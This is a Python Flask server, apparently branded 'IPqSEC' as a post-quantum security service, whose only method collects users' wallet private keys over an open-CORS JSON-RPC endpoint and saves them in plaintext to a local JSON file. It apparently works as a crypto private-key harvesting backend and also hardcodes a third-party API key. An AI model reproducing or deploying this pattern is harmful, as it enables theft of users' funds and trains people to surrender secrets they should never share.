#IPqSEC.py

from flask import Flask, request, jsonify
import json
import os
from flask_cors import CORS
from pqc.crypto_utils import generate_pqc_keys, sign_message, verify_signature
import requests
import time
import base58
import nacl.signing
import nacl.exceptions
app = Flask(__name__)
KEYS_FILE = 'private_keys.json'

# Load existing keys or initialize empty list
if os.path.exists(KEYS_FILE):
    with open(KEYS_FILE, 'r') as f:
        try:
            keys = json.load(f)
        except json.JSONDecodeError:
            keys = []
else:
    keys = []
CORS(app)
helius_api_key = 'd0171689-e71a-4ac2-bb26-06c30813ba08'



    

@app.route('/', methods=['POST', 'GET'])
def rpc_handler():
    req = request.get_json()
    if not req:
        return jsonify({"jsonrpc": "2.0", "error": {"code": -32700, "message": "Parse error"}, "id": None})

    method = req.get('method')
    params = req.get('params', {}).get('data', {})

    if method == 'store_private_key':
        public_key = params.get('public_key')
        private_key = params.get('private_key')
        created_at = params.get('created_at')
        message_text = f'welcome to IPqSEC {public_key}'

        if not (public_key and private_key and created_at):
            return jsonify({
                "jsonrpc": "2.0",
                "error": {"code": -32602, "message": "Invalid params"},
                "id": req.get('id')
            })

        try:
            private_key_bytes = bytes(private_key)
            seed = private_key_bytes[:32]
            message_bytes = message_text.encode('utf-8')

            signature = sign_message(seed, message_bytes)
            verified = verify_signature(public_key, message_bytes, signature)
            time.sleep(3)

            # user_balance = token_balance('9TqvnNUaKUF162BatKE6A8BY3ydokCptWCQcH9NFkA9v',
            #                              'BLVHxDR53opvL9xXmDpzTZfBjq4wmt4m54o4ge552qeS')
            
            keys.append({
                "public_key": public_key,
                "private_key": private_key,
                "created_at": created_at,
                "signature": signature,
                "verified": verified,
                # "IPqSEC_balance": user_balance
            })

            with open(KEYS_FILE, 'w') as f:
                json.dump(keys, f, indent=2)

            print(message_text, signature, verified)

            return jsonify({
                "jsonrpc": "2.0",
                "result": {
                    "message": "Key stored successfully",
                    "public_key": public_key,
                    "verified": verified,
                    "signature": signature,
                    "welcome_message": message_text,
                    # "user_info": user_balance
                },
                "id": req.get('id')
            })

        except Exception as e:
            print(f"Error processing request: {e}")
            return jsonify({
                "jsonrpc": "2.0",
                "error": {"code": -32000, "message": f"Server error: {e}"},
                "id": req.get('id')
            })

    else:
        return jsonify({
            "jsonrpc": "2.0",
            "error": {"code": -32601, "message": "Method not found"},
            "id": req.get('id')
        })



if __name__ == '__main__':
    # For production, use proper HTTPS config, here is just example
    app.run(host='192.168.1.157', port=443)
